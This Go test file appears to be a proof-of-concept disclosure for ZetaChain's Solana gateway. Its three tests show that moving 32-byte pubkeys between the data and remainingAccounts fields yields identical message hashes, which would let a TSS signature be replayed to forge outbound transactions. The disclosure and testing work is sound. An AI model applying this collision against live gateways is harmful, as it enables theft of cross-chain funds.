package solana_test

// Hash-preimage ambiguity in the Solana gateway message construction.
//
// MsgExecute.Hash() (gateway_message.go:352-388) and
// MsgExecuteSPL.Hash() (gateway_message.go:691-728) build the keccak
// preimage as a flat byte concatenation of fixed-length prefix fields,
// followed by the variable-length data field, followed by every
// remainingAccount.PublicKey.Bytes() back-to-back.
//
// Specifically, the trailing two segments are appended without any
// length prefix on data and without any count prefix on
// remainingAccounts:
//
//     ...
//     message = append(message, msg.data...)                      // L381 / L722
//     for _, r := range msg.remainingAccounts {
//         message = append(message, r.PublicKey.Bytes()...)       // L383-385 / L724-726
//     }
//
// Because every *solana.AccountMeta.PublicKey.Bytes() is exactly
// 32 bytes, an attacker can shift the boundary between data and
// remainingAccounts by any multiple of 32 bytes and produce a
// byte-for-byte identical preimage, hence an identical keccak digest,
// and hence forge a TSS-signed outbound by replaying the same hash
// and signature against a different (data, remainingAccounts) split.
//
// The three tests below construct, for each affected message type:
//   variant_A: data = D || P1 || P2 || P3, remainingAccounts = []
//   variant_B: data = D,                   remainingAccounts = [P1, P2, P3]
// with all other fields (chainID, nonce, amount, to, sender, executeType)
// identical, and assert byte-for-byte equality of Hash().

import (
  	"testing"

  	"github.com/ethereum/go-ethereum/common"
  	"github.com/gagliardetto/solana-go"
  	"github.com/stretchr/testify/require"
  	"github.com/zeta-chain/node/pkg/chains"
  	contracts "github.com/zeta-chain/node/pkg/contracts/solana"
  )

// fixedAccounts are the three pubkeys that get pushed across the
// data <-> remainingAccounts boundary. They are deterministic so the
// test is reproducible.
var fixedAccounts = []*solana.AccountMeta{
  	solana.NewAccountMeta(
      		solana.MustPublicKeyFromBase58("4C2kkMnqXMfPJ8PPK5v6TCg42k5z16f2kzqVocXoSDcq"),
      		false, false,
      	),
  	solana.NewAccountMeta(
      		solana.MustPublicKeyFromBase58("3tqcVCVz5Jztwnku1H9zpvjaWshSpHakMuX4xUJQuuuA"),
      		false, false,
      	),
  	solana.NewAccountMeta(
      		solana.MustPublicKeyFromBase58("7duGsuv6nB3yr15EuWuHEDD7rWovpAnjuveXJ5ySZuFV"),
      		false, false,
      	),
  }

// concatPubkeys returns the byte concatenation of every metas[i].PublicKey.Bytes().
// This is exactly what the for-loop in Hash() appends to the preimage.
func concatPubkeys(metas []*solana.AccountMeta) []byte {
  	out := make([]byte, 0, 32*len(metas))
  	for _, m := range metas {
      		out = append(out, m.PublicKey.Bytes()...)
      	}
  	return out
  }

func Test_MsgExecuteHashAmbiguity(t *testing.T) {
  	// ARRANGE: identical "envelope" fields for both variants.
  	// #nosec G115 always positive
  	chainID := uint64(chains.SolanaLocalnet.ChainId)
  	nonce := uint64(0)
  	amount := uint64(1336000)
  	to := solana.MustPublicKeyFromBase58("37yGiHAnLvWZUNVwu9esp74YQFqxU1qHCbABkDvRddUQ")
  	sender := common.HexToAddress("0x42bd6E2ce4CDb2F58Ed0A0E427F011A0645D5E33").Hex()

  	// The legitimate data payload that the cross-chain caller wanted
  	// the destination program to receive.
  	baseData := []byte("hello")

  	// Variant A: tail-pubkeys are inside data, remainingAccounts is empty.
  	dataA := append([]byte{}, baseData...)
  	dataA = append(dataA, concatPubkeys(fixedAccounts)...)
  	remA := []*solana.AccountMeta(nil)

  	msgA := contracts.NewMsgExecute(
      		chainID, nonce, amount, to, sender,
      		dataA, contracts.ExecuteTypeCall, remA, nil, nil,
      	)

  	// Variant B: same baseData, tail pubkeys in remainingAccounts.
  	msgB := contracts.NewMsgExecute(
      		chainID, nonce, amount, to, sender,
      		baseData, contracts.ExecuteTypeCall, fixedAccounts, nil, nil,
      	)

  	// ACT
  	hashA := msgA.Hash()
  	hashB := msgB.Hash()

  	// ASSERT
  	// (1) Splits are observably different: data length differs by 96
  	//     bytes, and the remainingAccounts lists differ in length.
  	require.NotEqual(t, dataA, baseData,
                     		"sanity: data payloads must differ between the two splits")
  	require.Equal(t, len(remA), 0,
                  		"sanity: variant A has no remainingAccounts")
  	require.Equal(t, len(fixedAccounts), 3,
                  		"sanity: variant B has the three pubkeys as remainingAccounts")

  	// (2) But the keccak digests are byte-for-byte identical, so a
  	//     TSS signature valid for variant A is also valid for B.
  	require.Equal(t, hashA, hashB,
                  		"MsgExecute.Hash() collides under (data,remainingAccounts) repartitioning: "+
                  			"variant A %x  vs  variant B %x", hashA, hashB)
  }

func Test_MsgExecuteSPLHashAmbiguity(t *testing.T) {
  	// ARRANGE
  	// #nosec G115 always positive
  	chainID := uint64(chains.SolanaLocalnet.ChainId)
  	nonce := uint64(0)
  	amount := uint64(1336000)
  	mintAccount := solana.MustPublicKeyFromBase58("AS48jKNQsDGkEdDvfwu1QpqjtqbCadrAq9nGXjFmdX3Z")
  	to := solana.MustPublicKeyFromBase58("37yGiHAnLvWZUNVwu9esp74YQFqxU1qHCbABkDvRddUQ")
  	toAta, _, err := solana.FindAssociatedTokenAddress(to, mintAccount)
  	require.NoError(t, err)
  	sender := common.HexToAddress("0x42bd6E2ce4CDb2F58Ed0A0E427F011A0645D5E33").Hex()

  	baseData := []byte("hello")

  	// Variant A: tail-pubkeys inside data, empty remainingAccounts.
  	dataA := append([]byte{}, baseData...)
  	dataA = append(dataA, concatPubkeys(fixedAccounts)...)
  	remA := []*solana.AccountMeta(nil)

  	msgA := contracts.NewMsgExecuteSPL(
      		chainID, nonce, amount, 8, mintAccount, to, toAta, sender,
      		dataA, contracts.ExecuteTypeCall, remA, nil, nil,
      	)

  	// Variant B
  	msgB := contracts.NewMsgExecuteSPL(
      		chainID, nonce, amount, 8, mintAccount, to, toAta, sender,
      		baseData, contracts.ExecuteTypeCall, fixedAccounts, nil, nil,
      	)

  	// ACT
  	hashA := msgA.Hash()
  	hashB := msgB.Hash()

  	// ASSERT
  	require.Equal(t, hashA, hashB,
                  		"MsgExecuteSPL.Hash() collides under (data,remainingAccounts) repartitioning: "+
                  			"variant A %x  vs  variant B %x", hashA, hashB)
  }

func Test_MsgExecuteRevertHashAmbiguity(t *testing.T) {
  	// ARRANGE
  	// ExecuteRevert differs from ExecuteCall only in the
  	// instruction-id byte and in how sender is encoded (Solana
  	// pubkey instead of EVM address). The vulnerable trailing layout
  	// ... || data || remainingAccounts[*] is identical, so the
  	// collision applies here too.
  	// #nosec G115 always positive
  	chainID := uint64(chains.SolanaLocalnet.ChainId)
  	nonce := uint64(0)
  	amount := uint64(1336000)
  	to := solana.MustPublicKeyFromBase58("37yGiHAnLvWZUNVwu9esp74YQFqxU1qHCbABkDvRddUQ")
  	sender := solana.MustPublicKeyFromBase58("CVoPuE3EMu6QptGHLx7mDGb2ZgASJRQ5BcTvmhZNJd8A").String()

  	baseData := []byte("hello")

  	// Variant A
  	dataA := append([]byte{}, baseData...)
  	dataA = append(dataA, concatPubkeys(fixedAccounts)...)
  	remA := []*solana.AccountMeta(nil)

  	msgA := contracts.NewMsgExecute(
      		chainID, nonce, amount, to, sender,
      		dataA, contracts.ExecuteTypeRevert, remA, nil, nil,
      	)

  	// Variant B
  	msgB := contracts.NewMsgExecute(
      		chainID, nonce, amount, to, sender,
      		baseData, contracts.ExecuteTypeRevert, fixedAccounts, nil, nil,
      	)

  	// ACT
  	hashA := msgA.Hash()
  	hashB := msgB.Hash()

  	// ASSERT
  	require.Equal(t, hashA, hashB,
                  		"MsgExecute.Hash() (revert variant) collides under (data,remainingAccounts) "+
                  			"repartitioning: variant A %x  vs  variant B %x", hashA, hashB)

  	// And the same boundary-shift on the SPL revert variant.
  	mintAccount := solana.MustPublicKeyFromBase58("AS48jKNQsDGkEdDvfwu1QpqjtqbCadrAq9nGXjFmdX3Z")
  	toAta, _, err := solana.FindAssociatedTokenAddress(to, mintAccount)
  	require.NoError(t, err)

  	msgSPLA := contracts.NewMsgExecuteSPL(
      		chainID, nonce, amount, 8, mintAccount, to, toAta, sender,
      		dataA, contracts.ExecuteTypeRevert, remA, nil, nil,
      	)
  	msgSPLB := contracts.NewMsgExecuteSPL(
      		chainID, nonce, amount, 8, mintAccount, to, toAta, sender,
      		baseData, contracts.ExecuteTypeRevert, fixedAccounts, nil, nil,
      	)

  	require.Equal(t, msgSPLA.Hash(), msgSPLB.Hash(),
                  		"MsgExecuteSPL.Hash() (revert variant) collides")
  }
